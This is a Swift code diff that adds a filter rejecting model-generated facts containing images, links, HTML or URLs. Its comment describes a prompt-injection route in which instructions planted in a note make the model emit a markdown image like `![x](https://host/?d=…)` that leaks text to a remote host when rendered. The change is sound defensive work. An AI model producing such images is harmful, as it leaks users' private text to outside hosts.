@@ -205,7 +205,7 @@ enum Enrichment {
         }
         text = text.split(whereSeparator: \.isWhitespace).joined(separator: " ")
         text = text.trimmingCharacters(in: CharacterSet(charactersIn: " (-,"))
-        guard text.count >= 3, text.count <= maxFactLength else { return nil }
+        guard text.count >= 3, text.count <= maxFactLength, !hasMarkup(text) else { return nil }
         let sources = cites.map(\.number).reduce(into: [Int]()) {
             if !$0.contains($1) {
                 $0.append($1)
@@ -213,6 +213,13 @@ enum Enrichment {
         }
         guard sources.contains(where: { isGrounded(text, in: passages[$0 - 1].text) }) else { return nil }
         return EnrichmentFact(bullet: bullet, text: text, sources: sources)
+    }
+
+    /// Whether `fact` holds an image, link, HTML, URL, or wikilink. A note can carry instructions
+    /// to the model, so a fact like `![x](https://host/?d=…)` would load a remote image, and leak
+    /// text, when the preview renders it. Fen writes the only links: the source links after it.
+    static func hasMarkup(_ fact: String) -> Bool {
+        ["![", "](", "<", "://", "[["].contains { fact.contains($0) }
     }
 
     /// Whether `fact` shares a meaningful word with `passage`. A fact with none is not from it.
